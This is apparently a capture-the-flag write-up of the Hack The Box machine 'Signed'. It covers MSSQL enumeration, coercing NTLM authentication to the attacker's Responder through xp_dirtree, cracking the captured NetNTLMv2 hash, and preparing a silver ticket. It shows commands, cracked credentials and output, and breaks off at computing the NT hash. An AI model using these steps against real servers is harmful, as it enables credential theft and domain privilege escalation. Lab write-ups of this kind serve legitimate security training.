---
created: 2026-10-04
modified: 2026-10-04
---

![[Pasted_image_20251012080623.png]]

Initial credentials 

```
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
```

## Port Scan

```bash
sudo nmap -Pn -p- -sCV --min-rate 2000 -T 2 -oN signed-port-scan 10.129.239.140
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 08:08 EAT
Nmap scan report for 10.129.239.140
Host is up (0.24s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.239.140:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-10-12T05:10:16+00:00; +2s from scanner time.
| ms-sql-info: 
|   10.129.239.140:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-12T04:41:02
|_Not valid after:  2055-10-12T04:41:02

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.12 seconds
```

We only have `ms-sql-s` service running on the host.

### MSSQL

```bash
impacket-mssqlclient SIGNED.HTB/scott:'Sm230#C5NatH'@10.129.239.140 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC01): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
```

Login fails. Omitting the `-windows-auth` we are able to login.

```bash
impacket-mssqlclient SIGNED.HTB/scott:'Sm230#C5NatH'@10.129.239.140              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (scott  guest@master)> 
```

Further enumeration i get this.

```bash
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (scott  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (scott  guest@master)> xp_cmdshell "whoami"
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

We don't have permissions to enable `xp_cmdshell` so that we can be able to execute system commands, we have no users we can impersonate, there are no `linked servers` info about linked servers check this [[DarkZero#1433/tcp open ms-sql-s]]  and finally we can not execute system commands.

enumerating logins and users i get this.

![[Pasted_image_20251012090147.png]]

we  have another user `sa` who has `sysadmin` privileges and has the role name `db_owner` and username `dbo`.

We have to find a way to compromise this user then enable `xp_cmdshell`.

Further enumeration I get this:

```bash
SQL (scott  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

SQL (scott  guest@master)> enum_owner
Database   Owner   
--------   -----   
master     sa      

tempdb     sa      

model      sa      

msdb       sa   
```


> [!question]
> What does `is_trustworthy_on` mean ?
> 
> The is_trustworthy_on property in SQL Server is a database-level setting that determines whether the database is considered **"trustworthy"** for certain security-sensitive operations. Specifically:
> 
> **Definition**: When a database has `is_trustworthy_on = 1 (enabled)`, SQL Server trusts the database to execute certain operations without additional security checks. This includes allowing objects like `stored procedures`, `functions`, or `triggers` in the database to execute with the privileges of their owner e.g., `sa` rather than the caller, even if the caller has lower privileges like `scott` in this case.
> 
> **Implications**:
> - If a stored procedure in a trustworthy database is marked with `EXECUTE AS OWNER `and owned by a privileged user e.g., `sa`, it runs with the owner’s permissions, potentially allowing a low-privileged user like `scott` to escalate privileges.
> - This is particularly relevant for the msdb database, as it often contains system objects (e.g., SQL Server Agent jobs, stored procedures) that might run as sa or another high-privileged account.


`msdb` is the database of interest here. It has the following tables.

```bash
SQL (scott  guest@msdb)> SELECT name FROM sys.tables;
name                                
---------------------------------   
dm_hadr_automatic_seeding_history   

backupmediaset                      

backupmediafamily                   

backupset                           

backupfile                          

restorehistory                      

restorefile                         

restorefilegroup                    

logmarkhistory                      

suspect_pages   
```

```sql
USE msdb;

-- List stored procedures
SELECT 
    name,
    OBJECTPROPERTY(object_id, 'IsMSShipped') AS is_system_procedure,
    OBJECTPROPERTY(object_id, 'ExecIsCaller') AS is_execute_as_caller,
    USER_NAME(principal_id) AS owner
FROM sys.procedures;

-- Check permissions on stored procedures
SELECT 
    p.name,
    USER_NAME(p.principal_id) AS owner,
    perm.permission_name,
    perm.state_desc
FROM msdb.sys.procedures p
JOIN msdb.sys.database_permissions perm
    ON p.object_id = perm.major_id
WHERE perm.grantee_principal_id = USER_ID('scott')
    AND perm.permission_name = 'EXECUTE';

-- List functions
SELECT 
    name,
    type_desc,
    OBJECTPROPERTY(object_id, 'IsMSShipped') AS is_system_function,
    OBJECTPROPERTY(object_id, 'ExecIsCaller') AS is_execute_as_caller,
    USER_NAME(principal_id) AS owner
FROM sys.objects
WHERE type IN ('FN', 'IF', 'TF');

-- Check permissions on functions
SELECT 
    o.name,
    o.type_desc,
    USER_NAME(o.principal_id) AS owner,
    perm.permission_name,
    perm.state_desc
FROM msdb.sys.objects o
JOIN msdb.sys.database_permissions perm
    ON o.object_id = perm.major_id
WHERE o.type IN ('FN', 'IF', 'TF')
    AND perm.grantee_principal_id = USER_ID('scott')
    AND perm.permission_name IN ('EXECUTE', 'SELECT');

-- List triggers
SELECT 
    name,
    OBJECTPROPERTY(object_id, 'IsMSShipped') AS is_system_trigger,
    OBJECTPROPERTY(object_id, 'ExecIsCaller') AS is_execute_as_caller,
    USER_NAME(principal_id) AS owner
FROM sys.triggers;
```


One liners doing the same as above.

```sql
USE msdb; SELECT name, OBJECTPROPERTY(object_id, 'IsMSShipped') AS is_system_procedure, OBJECTPROPERTY(object_id, 'ExecIsCaller') AS is_execute_as_caller, USER_NAME(principal_id) AS owner FROM sys.procedures;

USE msdb; SELECT p.name, USER_NAME(p.principal_id) AS owner, perm.permission_name, perm.state_desc FROM sys.procedures p JOIN sys.database_permissions perm ON p.object_id = perm.major_id WHERE perm.grantee_principal_id = USER_ID('scott') AND perm.permission_name = 'EXECUTE';

USE msdb; SELECT name, type_desc, OBJECTPROPERTY(object_id, 'IsMSShipped') AS is_system_function, OBJECTPROPERTY(object_id, 'ExecIsCaller') AS is_execute_as_caller, USER_NAME(principal_id) AS owner FROM sys.objects WHERE type IN ('FN', 'IF', 'TF');

USE msdb; SELECT o.name, o.type_desc, USER_NAME(o.principal_id) AS owner, perm.permission_name, perm.state_desc FROM sys.objects o JOIN sys.database_permissions perm ON o.object_id = perm.major_id WHERE o.type IN ('FN', 'IF', 'TF') AND perm.grantee_principal_id = USER_ID('scott') AND perm.permission_name IN ('EXECUTE', 'SELECT');

USE msdb; SELECT t.name, OBJECTPROPERTY(t.object_id, 'IsMSShipped') AS is_system_trigger, OBJECTPROPERTY(t.object_id, 'ExecIsCaller') AS is_execute_as_caller, USER_NAME(tab.principal_id) AS table_owner FROM sys.triggers t JOIN sys.tables tab ON t.parent_id = tab.object_id;
```


Checking the execution permission on the procedures and functions  we get empty entries, meaning we have no permission to execute any.

```sql
SQL (scott  guest@msdb)> SELECT p.name, USER_NAME(p.principal_id) AS owner, perm.permission_name, perm.state_desc FROM sys.procedures p JOIN sys.database_permissions perm ON p.object_id = perm.major_id WHERE perm.grantee_principal_id = USER_ID('scott') AND perm.permission_name = 'EXECUTE';

name   owner   permission_name   state_desc   
----   -----   ---------------   ----------   

SQL (scott  guest@msdb)> SELECT o.name, o.type_desc, USER_NAME(o.principal_id) AS owner, perm.permission_name, perm.state_desc FROM sys.objects o JOIN sys.database_permissions perm ON o.object_id = perm.major_id WHERE o.type IN ('FN', 'IF', 'TF') AND perm.grantee_principal_id = USER_ID('scott') AND perm.permission_name IN ('EXECUTE', 'SELECT');

name   type_desc   owner   permission_name   state_desc   
----   ---------   -----   ---------------   ----------   

SQL (scott  guest@msdb)>
```


I didn't get anything useful from the other databases.  Decided to switch to `metasploit`


```bash
msf6 > search mssql_login

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/mssql/mssql_login  .                normal  No     MSSQL Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_login

msf6 > use auxiliary/scanner/mssql/mssql_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf6 auxiliary(scanner/mssql/mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   ANONYMOUS_LOGIN      false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS      true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   CreateSession        false            no        Create a new session for every successful login
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING     none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option set)
   VERBOSE              true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```

```bash
set RHOSTS 10.129.239.140
set USERNAME scott
set PASSWORD Sm230#C5NatH
set RPORT 1433
set USE_WINDOWS_AUTHENT false
set CreateSession true
```

this will result to us having a `SQL` session as `scott`

```bash
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 auxiliary(admin/mssql/mssql_enum) > sessions

Active sessions
===============

  Id  Name  Type                  Information                        Connection
  --  ----  ----                  -----------                        ----------
  1         mssql x86_64/Windows  MSSQL scott @ 10.129.239.140:1433  10.10.16.26:36429 -> 10.129.239.140:1433 (10.129.239.140)

msf6 auxiliary(admin/mssql/mssql_enum) > set session 1
session => 1
msf6 auxiliary(admin/mssql/mssql_enum) > run
[*] Running MS SQL Server Enumeration...
[*] Using existing session 1
[*] Version:
[*]	Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
[*]		Oct  8 2022 05:58:25 
[*]		Copyright (C) 2022 Microsoft Corporation
[*]		Enterprise Evaluation Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] Configuration Parameters:
[*] 	C2 Audit Mode is Not Enabled
[*] 	xp_cmdshell is Not Enabled
[*] 	remote access is Enabled
[*] 	allow updates is Not Enabled
[*] 	Database Mail XPs is Not Enabled
[*] 	Ole Automation Procedures are Not Enabled
[*] Databases on the server:
[*] 	Database name:master
[*] 	Database Files for master:
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\master.mdf
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
[*] 	Database name:tempdb
[*] 	Database Files for tempdb:
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\tempdb.mdf
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\templog.ldf
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\tempdb_mssql_2.ndf
[*] 	Database name:model
[*] 	Database Files for model:
[*] 	Database name:msdb
[*] 	Database Files for msdb:
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
[*] System Logins on this Server:
[*] 	sa
[*] 	scott
[*] Disabled Accounts:
[*] 	No Disabled Logins Found
[*] No Accounts Policy is set for:
[*] 	All System Accounts have the Windows Account Policy Applied to them.
[*] Password Expiration is not checked for:
[*] 	sa
[*] 	scott
[*] System Admin Logins on this Server:
[*] 	sa
[*] Windows Logins on this Server:
[*] 	No Windows logins found!
[*] Windows Groups that can logins on this Server:
[*] 	No Windows Groups where found with permission to login to system.
[*] Accounts with Username and Password being the same:
[*] 	No Account with its password being the same as its username was found.
[*] Accounts with empty password:
[*] 	No Accounts with empty passwords where found.
[*] Stored Procedures with Public Execute Permission found:
[*] 	sp_replsetsyncstatus
[*] 	sp_replcounters
[*] 	sp_replsendtoqueue
[*] 	sp_resyncexecutesql
[*] 	sp_prepexecrpc
[*] 	sp_repltrans
[*] 	sp_xml_preparedocument
[*] 	xp_qv
[*] 	xp_getnetname
[*] 	sp_releaseschemalock
[*] 	sp_refreshview
[*] 	sp_replcmds
[*] 	sp_unprepare
[*] 	sp_resyncprepare
[*] 	sp_createorphan
[*] 	xp_dirtree
[*] 	sp_replwritetovarbin
[*] 	sp_replsetoriginator
[*] 	sp_xml_removedocument
[*] 	sp_repldone
[*] 	sp_reset_connection
[*] 	xp_fileexist
[*] 	xp_fixeddrives
[*] 	sp_getschemalock
[*] 	sp_prepexec
[*] 	xp_revokelogin
[*] 	sp_execute_external_script
[*] 	sp_resyncuniquetable
[*] 	sp_replflush
[*] 	sp_resyncexecute
[*] 	xp_grantlogin
[*] 	sp_droporphans
[*] 	xp_regread
[*] 	sp_getbindtoken
[*] 	sp_replincrementlsn
[*] Instances found on this server:
[*] Default Server Instance SQL Server Service is running under the privilege of:
[*] 	SIGNED\mssqlsvc
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_enum) > 
```

Nothing of much use from the output. But we identified that the SQL Service is running under `SIGNED\mssqlsvc`.

Searching for other interesting module using `search mssql` I get a bunch of them.. tried several but this one worked. 👇

Stealing hashes using `auxiliary/admin/mssql/mssql_ntlm_stealer`

```bash
msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) > show options

Module options (auxiliary/admin/mssql/mssql_ntlm_stealer):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD             Sm230#C5NatH     no        The password for the specified username
   RHOSTS               10.129.239.140   yes       The target host(s), see https://docs.metasploit.com/docs/
                                                   using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   SMBPROXY             10.10.16.26      yes       IP of SMB proxy or sniffer.
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             scott            no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option set)


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) > 
```

running the auxiliary

```bash
msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) > run
[*] 10.129.239.140:1433   - DONT FORGET to run a SMB capture or relay module!
[*] 10.129.239.140:1433   - Forcing SQL Server at 10.129.239.140 to auth to 10.10.16.26 via xp_dirtree...
[+] 10.129.239.140:1433   - Successfully executed xp_dirtree on 10.129.239.140
[+] 10.129.239.140:1433   - Go check your SMB relay or capture module for goodies!
[*] 10.129.239.140:1433   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

we need to set up an SMB proxy or sniffer. Am going to use responder 

```bash
sudo responder -A -I tun0

[SNIP]

[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv2-SSP Client   : 10.129.239.140
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:5a26a4c9e95a2114:D999B01D848068421943C007D7BD898D:0101000000000000009857125D3BDC0160F63278DAA9D24000000000020008004E004C0032005A0001001E00570049004E002D0030004C005900420045004A004500570055004B00490004003400570049004E002D0030004C005900420045004A004500570055004B0049002E004E004C0032005A002E004C004F00430041004C00030014004E004C0032005A002E004C004F00430041004C00050014004E004C0032005A002E004C004F00430041004C0007000800009857125D3BDC0106000400020000000800300030000000000000000000000000300000BD8105B9C800CE7379530EBBF7EE3E920881E3571C5592CFAAF91298AD1ACE8C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320036000000000000000000
```

We get the `NTLMv2` hash for `mssqlsvc`. We can not use `NTLMv2` for `pth` attacks, cracking is the only option we have.

Cracked successfully 😊

```bash
hashcat mssqlsvc-ntv2.hash /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

MSSQLSVC::SIGNED:5a26a4c9e95a2114:d999b01d848068421943c007d7bd898d:0101000000000000009857125d3bdc0160f63278daa9d24000000000020008004e004c0032005a0001001e00570049004e002d0030004c005900420045004a004500570055004b00490004003400570049004e002d0030004c005900420045004a004500570055004b0049002e004e004c0032005a002e004c004f00430041004c00030014004e004c0032005a002e004c004f00430041004c00050014004e004c0032005a002e004c004f00430041004c0007000800009857125d3bdc0106000400020000000800300030000000000000000000000000300000bd8105b9c800ce7379530ebbf7ee3e920881e3571c5592cfaaf91298ad1ace8c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320036000000000000000000:purPLE9795!@
```

`mssqlsvc : purPLE9795!@`


#### MSSQL session as mssqlsvc

We still don't have permission to enable `xp_cmdshell`. A bit puzzled since i expected to have full control on the SQL service 😕

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/signed]
└─$ impacket-mssqlclient SIGNED.HTB/mssqlsvc:'purPLE9795!@'@10.129.239.140
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC01): Line 1: Login failed for user 'mssqlsvc'.
                                                                                     
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/signed]
└─$ impacket-mssqlclient SIGNED.HTB/mssqlsvc:'purPLE9795!@'@10.129.239.140 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (SIGNED\mssqlsvc  guest@master)> 
```

Got something interesting we can impersonate a user

```bash
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor                        
----------   --------   ---------------   ----------   --------   ----------------------------   
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser  
```

This is our strongest lead, we can impersonate `dc_admin` in `msdb` database.

Trying to impersonate `dc_admin` fails 😭

```bash
SQL (SIGNED\mssqlsvc  guest@msdb)> exec_as_user dc_admin
ERROR(DC01): Line 1: Cannot execute as the database principal because the principal "dc_admin" does not exist, this type of principal cannot be impersonated, or you do not have permission.
SQL (SIGNED\mssqlsvc  guest@msdb)> 
```

Maybe its the syntax i told myself. Enumerating users 

![[Pasted_image_20251012172354.png]]

I noticed that `dc_admin` is the role the username is `MS_DataCollectorInternalUser`. 

That also fails.

```bash
SQL (SIGNED\mssqlsvc  guest@msdb)> exec_as_user MS_DataCollectorInternalUser
ERROR(DC01): Line 1: Cannot execute as the database principal because the principal "MS_DataCollectorInternalUser" does not exist, this type of principal cannot be impersonated, or you do not have permission.
```

More on `mssql` penetration testing can be located [here](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)

> [!info]
> SQL Server supports two authentication modes: **`SQL Authentication`** and **`Windows Authentication`**. `SQL Authentication` uses server-specific credentials, like `scott:Sm230#C5NatH` login, stored within SQL Server itself and tied to explicit database permissions. `Windows Authentication`, however, relies on `Windows` or `AD` credentials, such as `SIGNED\mssqlsvc` with its password or NTLM hash. The two authentication modes are differentiated by, for example in `impacket-mssqlclient`, the presence of this flag `-windows-auth`. Where it's presence indicates `windows Authentication.` When we used `impacket-mssqlclient -windows-auth` with the `mssqlsvc` credentials, SQL Server validated the login against AD, generating a Windows token. This token represents the domain user `SIGNED\mssqlsvc`, but its permissions depend on how SQL Server maps it to database users.
> 
> In SQL Server, a login exists at the server level, while a user is specific to a database, like `msdb` or `master`. When a Windows login connects, SQL Server checks for a corresponding user in the target database. If an explicit user mapping exists `(e.g., created via CREATE USER [SIGNED\mssqlsvc] FOR LOGIN [SIGNED\mssqlsvc])`, the login inherits the user’s roles, such as `db_owner` or `sysadmin`. Without this, the login defaults to the `guest` user, which has minimal permissions, typically limited to the `public role`. In your our, `SIGNED\mssqlsvc` had no explicit user mapping in `msdb` or `master`, so it mapped to `guest`, as seen in our session output, `SQL (SIGNED\mssqlsvc  guest@msdb)>`. The public role allows basic actions like querying system metadata e.g., `sys.databases` or `enum_users`, but it blocks privileged operations, such as enabling `xp_cmdshell` or` impersonating dc_admin`, which explains our permission errors.
> 


> [!question]
> Why logging in as `SIGNED\mssqlsvc` does not give us `sysadmin` permissions even though the Service is running under `SIGNED\mssqlsvc` ?
> 
> `SIGNED\mssqlsvc` SQL Server service account: the **Windows account under which the SQL Server process runs (service account)** is the identity the SQL service uses to access the OS and network resources. That service account **does not automatically** translate into an elevated SQL Server login for remote/ad-hoc connections. In other words, the fact that the SQL Server process runs as `SIGNED\mssqlsvc` does not automatically grant that domain account `sysadmin` or `CONTROL SERVER` privileges to interactive SQL sessions — such privileges exist only if that Windows account has been added as a SQL Server login with the appropriate server role.

#### How mapping actually works (SID matching)

 SQL Server matches server logins ↔ database users by the Windows **SID**.If a server login for `SIGNED\mssqlsvc` exists (sys.server_principals), and a DB user with the same SID exists in the database, the session receives that DB user’s privileges. If no DB user exists and `guest` is enabled, the session becomes `guest@db` (limited). If `guest` is disabled, the login cannot access that DB.


**Misconception:** "The SQL service runs as `SIGNED\mssqlsvc`, so anyone who authenticates as `SIGNED\mssqlsvc` must be sysadmin."  
**Reality:** Only if `SIGNED\mssqlsvc` was explicitly added as a SQL Server login and assigned sysadmin (or is a member of a Windows group that is mapped to sysadmin)


Below we see that we `mssqlsvc` does not have `sysadmin` permissions even though the service runs under the account.

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   
```

Lists `server_principals` 

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, type_desc FROM sys.server_principals WHERE type_desc IN ('WINDOWS_LOGIN', 'WINDOWS_GROUP');
name                        type_desc       
-------------------------   -------------   
SIGNED\IT                   WINDOWS_GROUP   

NT SERVICE\SQLWriter        WINDOWS_LOGIN   

NT SERVICE\Winmgmt          WINDOWS_LOGIN   

NT SERVICE\MSSQLSERVER      WINDOWS_LOGIN   

NT AUTHORITY\SYSTEM         WINDOWS_LOGIN   

NT SERVICE\SQLSERVERAGENT   WINDOWS_LOGIN   

NT SERVICE\SQLTELEMETRY     WINDOWS_LOGIN   

SIGNED\Domain Users         WINDOWS_GROUP   
```

Checking if the `SIGNED\IT` is a member of `sysadmin`

```sql
SQL (SIGNED\mssqlsvc  guest@master)> SELECT r.name AS role_name, p.name AS principal_name FROM sys.server_role_members rm JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id JOIN sys.server_principals p ON rm.member_principal_id = p.principal_id WHERE p.name = 'SIGNED\IT' AND r.name = 'sysadmin';
role_name   principal_name   
---------   --------------   
sysadmin    SIGNED\IT    
```

Nice `SIGNED\IT` has `sysadmin` privileges. Having access to the service account, `mssqlsvc` responsible for issuing `TGS` tickets for accessing the `mssql` service, we can easily forge a ticket that will grant us `sysadmin` rights.

#### Forging a silver ticket

First we need the `SID` for `mssqlsvc` by query `sys.server_principals`

```sql
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT name, sid, type_desc FROM sys.server_principals WHERE name = 'SIGNED\mssqlsvc';
name   sid   type_desc   
----   ---   ---------   
SQL (SIGNED\mssqlsvc  guest@msdb)> 
```

We get an empty entry

```sql
SELECT name, sid, type_desc FROM sys.server_principals WHERE type_desc IN ('WINDOWS_LOGIN', 'WINDOWS_GROUP');
```

We can also use this query to extract the SID of a specific account:

```sql
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\mssqlsvc')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000' 
```

We can use this python script to convert the hex to sid string 

```python
def hex_to_sid(hex_str: str) -> str:
    # Remove spaces or newlines
    hex_str = hex_str.replace(" ", "").replace("\n", "")
    data = bytes.fromhex(hex_str)

    # Basic SID structure
    revision = data[0]
    subauth_count = data[1]
    identifier_authority = int.from_bytes(data[2:8], byteorder="big")

    # Extract subauthorities (4 bytes each, little-endian)
    subauthorities = []
    offset = 8
    for _ in range(subauth_count):
        subauth = int.from_bytes(data[offset:offset+4], byteorder="little")
        subauthorities.append(subauth)
        offset += 4

    # Build SID string
    sid = f"S-{revision}-{identifier_authority}"
    for sub in subauthorities:
        sid += f"-{sub}"

    return sid


if __name__ == "__main__":
    hex_input = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
    print(hex_to_sid(hex_input))
```

```bash
python3 hex-sid.py                                                         
S-1-5-21-4088429403-1159899800-2753317549-1103
```

Here we know the domain SID is `S-1-5-21-4088429403-1159899800-2753317549` and the RID for `mssqlsvc` is `1103`

Next we need to get the `NT hash` for `mssqlsvc`. We can use this query but `mssqlsvc` is not among the accounts listed.

```sql
SELECT * FROM master.sys.syslogins;
```

But since we have the password we can calculate the NT hash using:

```python
import hashlib

password = "purPLE9795!@"

# Convert password to UTF-16LE bytes
password_bytes = password.encode('utf-16le')

# Calculate MD4 hash
md4_hash = hashlib.new('md4')
md4_hash.update(password_bytes)
ntlm_hash = md4_hash.hexdigest().upper()

print(f"NTLM Hash: {ntlm_hash}")
```

OR

```bash
echo -n 'purPLE9795!@' | iconv -t UTF-16LE | openssl dgst -md4
```

